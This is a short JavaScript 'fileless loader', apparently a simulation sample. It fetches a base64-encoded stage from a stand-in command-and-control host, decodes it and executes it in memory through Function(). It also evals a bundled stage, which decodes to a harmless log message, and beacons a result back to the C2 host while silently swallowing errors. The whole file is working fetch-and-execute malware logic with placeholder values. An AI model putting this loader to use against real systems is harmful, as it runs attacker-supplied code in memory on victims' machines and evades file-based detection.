// Fileless loader: fetch an encoded stage, decode with Function/eval and execute
// entirely in memory. No files, no persistence.
(function () {
  var C2 = 'https://c2.example.test/fileless';
  var stage = atob('Y29uc29sZS5sb2coJ1tGSUxFTEVTU10gc3RhZ2UtMiBleGVjdXRlZCBpbiBtZW1vcnknKTs=');
  console.log('[FILELESS] fetching stage', stage.length);
  try {
    fetch(C2 + '/stage')
      .then(function (response) { return response.text(); })
      .then(function (text) { return atob(text || ''); })
      .then(function (code) { if (code) Function(code)(); })
      .catch(function () {});
  } catch (error) {}
  try { eval(stage); } catch (error) {}
  try {
    fetch(C2 + '/result', { method: 'POST', body: btoa('executed:' + stage.length) }).catch(function () {});
  } catch (error) {}
  setTimeout(function () { console.log('[FILELESS] memory stage complete'); }, 400);
})();
